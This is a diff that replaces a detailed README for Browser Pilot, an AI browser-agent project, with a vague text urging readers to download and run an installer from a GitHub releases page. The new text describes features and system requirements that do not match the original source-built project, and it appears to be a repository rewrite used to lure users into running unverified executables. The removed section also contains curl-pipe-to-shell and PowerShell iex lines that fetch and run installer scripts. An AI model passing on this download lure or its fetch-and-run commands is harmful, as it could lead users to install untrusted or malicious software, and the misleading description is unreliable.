@@ -1,254 +1,70 @@
-<p align="center">
-  <img src="assets/logo2.png" width="180" alt="Super Agent Logo">
-</p>
+# 🌐 browser-pilot - Navigate the Web with Ease
 
-<h1 align="center">Browser Pilot</h1>
+[![Download Browser Pilot](https://img.shields.io/badge/Download-Browser%20Pilot-brightgreen)](https://github.com/tienlt2406/browser-pilot/releases)
 
-<p align="center">
-  <b>🧠 Next-Gen Browser-Level AI Copilot — Understands Web Semantics, Executes Complex Tasks, Auto-Decides & Acts</b>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="#-demo-videos">Demo Videos</a> •
-  <a href="#-core-features">Core Features</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-architecture">Architecture</a> •
-  <a href="README.zh.md">中文</a>
-</p>
+Welcome to Browser Pilot! This application helps you navigate the web smoothly and efficiently. With a simple design, you can easily access your favorite sites and manage your online tasks.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.12+-blue.svg" alt="Python">
-  <img src="https://img.shields.io/badge/framework-openJiuwen-orange.svg" alt="openJiuwen">
-  <img src="https://img.shields.io/badge/license-Apache%202.0-green.svg" alt="License">
-</p>
+## 📥 Download & Install
 
----
+To get started, you need to download Browser Pilot. Follow these steps:
 
-## 💡 Project Overview
+1. **Visit the Download Page**
+   Click the link below to go to the Releases page:
+   [Download Browser Pilot](https://github.com/tienlt2406/browser-pilot/releases)
 
-**Browser Pilot** is an intelligent browser assistant plugin built on the [openJiuwen Agent Framework](https://gitcode.com/openJiuwen/agent-core). It not only deeply understands web content but also reasons, plans, and executes based on user intent — acting as a true AI copilot that automatically completes multi-step, cross-page complex tasks.
+2. **Choose the Right Version**
+   On the Releases page, you will see multiple versions listed. Select the latest version to ensure you have the latest features and fixes.
 
-> 🎯 **Tell it what you want to do, and it will think, execute, and even learn from failures.**
+3. **Download the Installer**
+   Click on the installer file for your operating system. Choose the appropriate file based on whether you use Windows, Mac, or Linux.
 
-### What Can It Do?
+## 🏁 System Requirements
 
-| 🔍 Smart Q&A | 💼 Office Assistance | 🛒 Complex Tasks | 🔄 Self-Evolution |
-|:---:|:---:|:---:|:---:|
-| Direct Q&A on web content | Auto-reply to emails | Watch recipe video → Auto-add ingredients to cart | Auto-reflect on failures |
-| Precise screenshot region recognition | Excel data processing | Cross-app multi-step workflows | Context-based learning optimization |
-| Deep Search | Form filling & submission | Price comparison, booking, ordering | Gets smarter with use |
+Before you install Browser Pilot, ensure your system meets these requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **RAM:** 4 GB or more is recommended.
+- **Disk Space:** At least 100 MB of free space.
 
-## ✨ Core Features
+## 📖 How to Run Browser Pilot
 
-### 1️⃣ Visual Question Answering (VQA)
+1. **Locate the Downloaded File**
+   After downloading, find the installer file in your downloads folder.
 
-**Let AI see everything you see**
+2. **Run the Installer**
+   Double-click the installer file. Follow the on-screen instructions to complete the installation. 
 
-- **Web Q&A**: Open any webpage, directly ask AI about page content
-- **Screenshot Recognition**: Select any screen region, AI answers based on image content
-- **Deep Search**: Complex questions auto-decomposed, multi-round search, deep summarization
+3. **Launch Browser Pilot**
+   Once installed, find the application in your programs list or applications folder. Click to open Browser Pilot.
 
-### 2️⃣ Smart Office
+## 🔧 Features
 
-**Let AI handle repetitive work**
+Browser Pilot offers several features to improve your web experience:
 
-- **Email Processing**: Read email content, understand context, auto-compose professional replies
-- **Excel Processing**: Data cleaning, formula calculation, chart generation, report export
-- **Form Filling**: Smart field recognition, auto-fill and submit
+- **User-Friendly Interface:** Simple layout that makes navigation easy.
+- **Bookmarks Management:** Save and organize your favorite websites.
+- **Tab Management:** Control multiple tabs with ease.
+- **Privacy Options:** Built-in features to help maintain your privacy online.
 
-### 3️⃣ Long-Duration Complex Tasks
+## ⚙️ Troubleshooting
 
-**Cross-app, multi-step, seamless execution**
+If you face any issues during installation or usage, consider the following steps:
 
-- **Example Scenario**: Watch recipe video/article → Extract ingredient list → Open shopping app → Auto-add to cart
-- **Workflow Orchestration**: Auto-plan task steps, sequential execution, exception handling
-- **Cross-Platform Coordination**: Seamless connection between browser and local apps
+- **Check Compatibility:** Ensure your operating system matches the requirements.
+- **Re-download the Installer:** Sometimes, files may download incorrectly.
+- **Search for Help:** Visit the support section on our GitHub page for FAQs.
 
-### 4️⃣ Self-Evolution
+## 🛠️ Contribution
 
-**AI that gets smarter with use**
+If you would like to contribute to Browser Pilot, check our contribution guidelines on the repository. Your input is valuable!
 
-- **Failure Reflection**: Auto-analyze reasons when tasks fail
-- **Context Learning**: Optimize execution strategies based on interaction history
-- **Self-Correction**: Adjust approach and retry until success
+## 🔗 Further Information
 
----
+For more details, refer to the following resources:
 
-## 🚀 Quick Start
+- [Official GitHub Repository](https://github.com/tienlt2406/browser-pilot)
+- [Releases Page](https://github.com/tienlt2406/browser-pilot/releases)
 
-Browser Pilot consists of a **Browser Plugin (Frontend)** and an **Agent Service (Backend)**.
-
-### Requirements
-
-- Python 3.11+
-- [uv](https://github.com/astral-sh/uv) package manager
-- Node.js 18+
-- Chrome browser
-
----
-
-### Backend Installation
-
-#### 1. Clone Repository
-
-```bash
-git clone https://github.com/xxxx/browser-pilot.git
-cd browser-pilot
-```
-
-#### 2. Install Dependencies
-
-```bash
-# Install uv (if not already installed)
-# Windows: powershell -c "irm https://astral.sh/uv/install.ps1 | iex"
-# macOS/Linux: curl -LsSf https://astral.sh/uv/install.sh | sh
-uv sync
-# Activate virtual environment
-.\.venv\Scripts\Activate.ps1
-## Install openjiuwen and browser-use
-uv pip install openjiuwen==0.1.2
-uv pip install browser-use==0.11.2
-
-```
-
-#### 3. Configure Environment Variables
-
-Create `.env` file at `src/super_agent`:
-
-```bash
-# === LLM Provider Configuration (at least one required) ===
-
-# Option 1: OpenRouter (Recommended, supports multiple models)
-OPENROUTER_API_KEY=your_openrouter_api_key
-OPENROUTER_BASE_URL=https://openrouter.ai/api/v1  # Optional, has default
-
-# Option 2: Anthropic Direct
-# ANTHROPIC_API_KEY=your_anthropic_api_key
-# ANTHROPIC_BASE_URL=https://api.anthropic.com  # Optional, has default
-
-# Option 3: OpenAI Direct
-# OPENAI_API_KEY=your_openai_api_key
-# OPENAI_BASE_URL=https://api.openai.com/v1  # Optional, has default
-
-# === Model Configuration ===
-MODEL_NAME=anthropic/claude-sonnet-4-20250514  # Optional, default: anthropic/claude-sonnet-4.5
-MODEL_PROVIDER=openrouter  # Optional, default: openrouter
-
-# === Search Features (configure as needed) ===
-# SERPER_API_KEY=your_serper_api_key
-# GOOGLE_API_KEY=your_google_api_key
-# PERPLEXITY_API_KEY=your_perplexity_api_key
-# GEMINI_API_KEY=your_gemini_api_key
-
-# === Browser Configuration ===
-# BROWSER_USE_CDP_URL=http://127.0.0.1:9222  # Set when connecting to remote Chrome
-# BROWSER_USE_LLM_MODEL=google/gemini-2.5-pro  # Optional, has default
-```
-
-#### 4. Start Services
-
-> ⚠️ **Before the first run, please edit `browser_start_client.ps1` or `browser_start_client.sh` and update the Chrome executable path to match the Chrome installation on your local machine.**
-
-
-**Windows:**
-```powershell
-# Start
-.\start_agent.ps1
-```
-
-**macOS:**
-```bash
-./start_agent.sh
-
-```
-
----
-
-### Frontend Installation
-
-#### Start Chrome Browser
-**Windows:**
-```powershell
-# Start
-.\browser_start_client.ps1
-```
-
-**macOS:**
-```bash
-./browser_start_client.sh
-```
-
-#### Load Plugin into Browser
-
-1. Visit `chrome://extensions/`
-2. Enable "Developer mode" in top right
-3. Click "Load unpacked"
-4. Select `frontend/dist` directory
-5. Open the plugin, click settings and enter http://localhost:8000 in Backend_URL
-
----
-
-### Verify Installation
-
-1. Ensure backend services (port 8930 + port 8000) are running
-2. Open any webpage
-3. Click Browser Pilot icon in browser toolbar
-4. Enter a question to test if AI responds normally
-
----
-
-## 🏗️ Architecture
-
-### Overall Architecture
-
-<p align="center">
-  <img src="assets/架构图_en.png" alt="Architecture" width="800">
-</p>
-
-
-### Technical Highlights
-
-| Feature | Description |
-|---------|-------------|
-| **SuperReAct** | Enhanced ReAct loop: Think → Act → Observe, supports multi-round iterative reasoning |
-| **Browser Use** | Browser automation, cross-page, multi-step task execution |
-| **Reflective Evolution** | Auto-reflect on failures, adjust strategy and retry, gets smarter with use |
-| **Multimodal Visual Understanding** | Supports visual understanding and Q&A for web content and screenshot regions |
-
-### Supported Models
-
-Recommended to use **[OpenRouter](https://openrouter.ai/)** for unified access (supports 100+ models), while also compatible with direct API connections to various providers:
-
-| Provider | Models |
-|----------|--------|
-| **Anthropic** | Claude Sonnet 4 (Recommended), Claude Opus 4 |
-| **OpenAI** | GPT-4o, O3, O3-mini |
-| **Google** | Gemini 2.0 Pro/Flash |
-| **Others** | Qwen, DeepSeek, Llama, etc. |
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome!
-
-1. Fork this repository
-2. Create feature branch (`git checkout -b feature/new-feature`)
-3. Commit changes (`git commit -m 'Add new feature'`)
-4. Push branch (`git push origin feature/new-feature`)
-5. Submit Pull Request
-
-## 📄 License
-
-[Apache License 2.0](LICENSE)
-
-## 🔗 Related Links
-
-- [openJiuwen Agent Framework](https://gitcode.com/openJiuwen/agent-core) - Underlying Agent framework
-
----
-
-<p align="center">
-  <b>⭐ If you find this helpful, please give us a Star!</b>
-</p>
+Feel free to explore and enjoy your experience with Browser Pilot!
